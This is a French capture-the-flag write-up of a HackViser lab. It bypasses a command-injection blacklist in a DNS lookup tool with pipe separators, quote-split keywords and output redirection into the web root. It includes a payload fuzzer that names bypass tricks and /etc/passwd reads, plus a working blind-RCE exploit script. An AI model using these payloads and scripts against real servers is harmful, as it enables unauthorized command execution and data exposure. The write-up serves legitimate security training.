# Write-up: Command Injection Improved Filter Bypass (HackViser)

**Difficulté :** VIP / 3 Points  
**Catégorie :** Web / Injection de Commande  
**Objectif :** Trouver le hostname du serveur.

---

## 1. Reconnaissance

### Analyse de l'application

L'application propose un outil de "DNS Lookup". Elle prend un nom de domaine en entrée et exécute probablement une commande système (comme `nslookup` ou `dig`) en arrière-plan.

L'URL cible est : `https://learning-squirrel.europe1.hackviser.space`

### Tests Initiaux

En testant des injections classiques dans le formulaire :

* `example.com; ls` -> **Bloqué** ("Command contains blacklisted keyword")
* `example.com && whoami` -> **Bloqué**
* `$(whoami)` -> **Bloqué**

Il y a donc un filtre (WAF/Blacklist) qui analyse l'entrée utilisateur et rejette les requêtes contenant des caractères ou des mots-clés interdits.

---

## 2. Analyse du Filtre (Fuzzing)

Pour comprendre exactement ce qui est bloqué, nous avons besoin de tester chaque caractère individuellement.

### Identification du Paramètre

Une inspection rapide du code HTML (ou via `curl`) montre que le paramètre POST attendu est **`query`**, et non `domain` ou `ip` comme on pourrait le supposer.

```html
<input class="form-control" type="text" name="query" placeholder="Enter a domain" required>
```

### Script de Fuzzing

J'ai créé un script Python pour tester les caractères ASCII un par un.

* **Résultats du Fuzzing :**
  * **Bloqués** : `;`, `&`, `$` (probablement dans certains contextes), mots-clés comme `ls`, `cat`, `hostname`, `flag`.
  * **Autorisés** : `|` (Pipe), `'` (Simple quote), `>` (Redirection), `\` (Antislash).

Cette découverte est cruciale : le filtre bloque les séparateurs classiques (`;`, `&&`) mais oublie le **Pipe (`|`)**.

---

## 3. Élaboration de l'Exploit

### Contournement de la Blacklist (Obfuscation)

Même si le caractère `|` passe, l'envoi de `127.0.0.1|hostname` échoue car le mot "hostname" est sur liste noire.
Nous pouvons contourner cela en utilisant des quotes simples (`'`) à l'intérieur de la commande. Bash ignore les quotes vides ou concatène les chaînes, mais le WAF (qui fait une recherche de chaîne simple) ne reconnaît plus le mot interdit.

* `hostname` -> BLOQUÉ
* `'h'o's't'n'a'm'e` -> AUTORISÉ par le WAF, et exécuté comme `hostname` par le shell.

### Problème de Retour (Blind RCE)

L'exécution de `127.0.0.1|'l's` ne retourne pas le résultat de la commande dans la page HTML. L'application n'affiche probablement que le résultat du `nslookup` initial ou gère mal la sortie standard du pipe.
Nous sommes face à une **Blind RCE** (Remote Command Execution Aveugle).

### Solution : Redirection de Sortie

Puisque le caractère `>` est autorisé, nous pouvons rediriger la sortie de notre commande vers un fichier dans le répertoire web (accessible publiquement), puis lire ce fichier via le navigateur.

**Payload Final Construit :**

```bash
127.0.0.1|'h'o's't'n'a'm'e>host.txt
```

Ce payload fait 3 choses :

1. `127.0.0.1` : Satisfait la commande `nslookup` initiale (ou est ignoré).
2. `|` : Sépare la commande et permet d'enchaîner.
3. `'h'o's't'n'a'm'e` : Exécute `hostname` en contournant la détection de mot-clé.
4. `>host.txt` : Écrit le résultat dans un fichier `host.txt`.

---

## 4. Exécution et Résultat

### Injection

Envoi de la requête POST avec le payload :

```http
POST / HTTP/1.1
...
query=127.0.0.1|'h'o's't'n'a'm'e>host.txt
```

### Récupération

Accès au fichier créé : `https://learning-squirrel.europe1.hackviser.space/host.txt`

**Contenu du fichier :**

```
mutuality
```

---

## 5. Conclusion

Le hostname du serveur est **`mutuality`**.

### Résumé des failles

1. **Filtrage incomplet** : Le développeur a bloqué `;` et `&` mais a laissé `|`.
2. **Filtrage par liste noire simple** : La détection de mots-clés (`hostname`) est triviale à contourner avec de l'obfuscation (`'h'o's't'n'a'm'e`).
3. **Permissions d'écriture** : L'utilisateur exécutant le serveur web (`www-data`) a le droit d'écrire des fichiers dans le répertoire web racine, permettant l'exfiltration de données.

---

## 6. Scripts Utilisés

### Fuzzing Script (`fuzz_filter.py`)

Ce script a permis de tester caractères par caractères quels étaient les inputs autorisés par le WAF.

```python
import requests
import string
import sys

# Configuration
target_url = "https://learning-squirrel.europe1.hackviser.space"
# ATTENTION: Vérifie le nom du paramètre dans le code source de la page !
# C'est probablement 'domain', 'ip', 'hostname' ou quelque chose de similaire.
param_name = "query" 

# Liste des chaînes à identifier comme "Bloqué"
error_signatures = [
    "Command contains blacklisted keyword",
    "Error",
    "Invalid domain"
]

def check_payload(payload_val):
    try:
        # Envoie la requête POST
        # Note: Si le site utilise GET, changez en requests.get(...)
        response = requests.post(target_url, data={param_name: payload_val}, timeout=5)
        
        # Vérifie si la réponse contient une erreur connue
        for sig in error_signatures:
            if sig in response.text:
                return False, sig
        
        return True, response.text
    except Exception as e:
        return None, str(e)

def fuzz_chars():
    print(f"[*] Démarrage du fuzzing sur : {target_url}")
    print(f"[*] Paramètre utilisé : {param_name}")
    print("[*] Test des caractères spéciaux ASCII...")

    allowed_chars = []
    blocked_chars = []

    # Caractères spéciaux courants dans les injections
    chars = string.punctuation
    
    for char in chars:
        # On teste "example.com" + char
        # L'idée est de voir si le caractère LUI-MÊME déclenche le filtre
        payload = f"example.com{char}"
        
        is_allowed, reason = check_payload(payload)
        
        if is_allowed is None:
            print(f"[!] Erreur de connexion avec '{char}': {reason}")
        elif is_allowed:
            print(f"[+] AUTORISÉ (ou non filtré) : {char}")
            allowed_chars.append(char)
        else:
            print(f"[-] Bloqué : {char} (Raison: {reason})")
            blocked_chars.append(char)

    print("\n--- Résumé des caractères ---")
    print(f"Bloqués : {' '.join(blocked_chars)}")
    print(f"Autorisés : {' '.join(allowed_chars)}")
    return allowed_chars

def fuzz_common_payloads():
    print("\n[*] Test de payloads d'injection courants...")
    
    # Liste de techniques de bypass
    payloads = [
        # Séparateurs
        ";", "|", "&", "||", "&&", "\n", "\r", "%0a", "%0d",
        # Substitution
        "`id`", "$(id)",
        # Espaces alternatifs
        "${IFS}", "$IFS", "<", ">", "{cat,flag}",
        # Encodage double URL (parfois utile si décodé deux fois)
        "%250a", 
        # Redirection
        "1>2", "2>&1",
        # Globbing (si 'cat' est bloqué mais /bin/c?? passe)
        "/bin/c?? /etc/passwd",
        # Variable non définie (pour contourner les filtres de mots clés)
        "c$u/flag", "ca$t /etc/passwd"
    ]

    for p in payloads:
        # On essaie d'injecter après un domaine valide
        full_payload_1 = f"example.com{p}" 
        # Et aussi tout seul (si allowed)
        full_payload_2 = p

        # Test simple
        is_allowed, reason = check_payload(full_payload_1)
        if is_allowed:
             print(f"[+] PAYLOAD PASSE (partiel) : '{p}' -> Contenu de la réponse à vérifier !")
        
fuzz_chars()
fuzz_common_payloads()
```

### Exploit Script (`poc_exploit.py`)

Ce script a permis de valider l'injection et d'extraire le flag.

```python
import requests

target_url = "https://learning-squirrel.europe1.hackviser.space"
param_name = "query"

# Payloads pour RCE avec écriture de fichier (Blind via redirection)
payloads_to_try = [
    # 1. Test basique : ls > out.txt
    "127.0.0.1|'l's>out.txt",
    
    # 2. Test whoami > out.txt
    "127.0.0.1|'w'h'o'a'm'i>out.txt",
    
    # 3. Test pwd > out.txt
    "127.0.0.1|'p'w'd>out.txt",
    
    # 4. Test avec chemin absolu si PATH est vide
    "127.0.0.1|/bin/ls>ls.txt",

    # 5. Obtenir le HOSTNAME (Objectif du challenge)
    "127.0.0.1|'h'o's't'n'a'm'e>host.txt",
]

def check_out_file(filename):
    try:
        r = requests.get(f"{target_url}/{filename}")
        if r.status_code == 200 and len(r.text) > 0 and "html" not in r.text:
            print(f"    [!!!] FILE CREATED: {filename}")
            print(f"    [!!!] CONTENT:\n{r.text}")
            return True
    except:
        pass
    return False

def test_payload(payload):
    print(f"[*] Testing payload: {payload!r}")
    try:
        resp = requests.post(target_url, data={param_name: payload}, timeout=5)
        
        if "Command contains blacklisted keyword" in resp.text:
            print("    [-] BLOCKED (keyword blacklist)")
        elif "Error" in resp.text:
            print(f"    [-] ERROR (generic)")
        else:
            print("    [+] BYPASS OK. Checking for output file...")
            # On vérifie si un fichier a été créé (on suppose out.txt ou ls.txt selon le payload)
            if "out.txt" in payload: check_out_file("out.txt")
            if "ls.txt" in payload: check_out_file("ls.txt")
            if "host.txt" in payload: check_out_file("host.txt")

    except Exception as e:
        print(f"    [!] Exception: {e}")

print("--- Starting Targeted Payload Fuzzing ---")
for p in payloads_to_try:
    test_payload(p)
```
